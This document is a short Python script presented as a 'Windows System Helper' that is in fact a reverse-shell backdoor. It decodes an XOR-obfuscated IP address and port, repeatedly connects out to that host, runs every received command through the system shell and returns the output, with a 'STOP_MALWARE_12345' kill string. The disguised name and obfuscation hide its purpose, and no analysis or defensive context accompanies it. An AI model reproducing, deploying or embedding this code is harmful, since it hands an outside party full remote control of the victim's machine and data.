# Windows System Helper


def bTNtHkBLOcUZ(encrypted):
    key = 66
    return ''.join(chr(ord(c) ^ key) for c in encrypted)

host = bTNtHkBLOcUZ("s{plstzlslpz")
port = int("7715") ^ 66

def MIonSHRFBpTL():
    socket = __import__('socket')
    subprocess = __import__('subprocess')
    os = __import__('os')
    time = __import__('time')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            while True:
                cmd = s.recv(4096).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    break
                if cmd == "STOP_MALWARE_12345":
                    os._exit(0)

                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
                s.send(result + b"\n")

            s.close()
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    MIonSHRFBpTL()
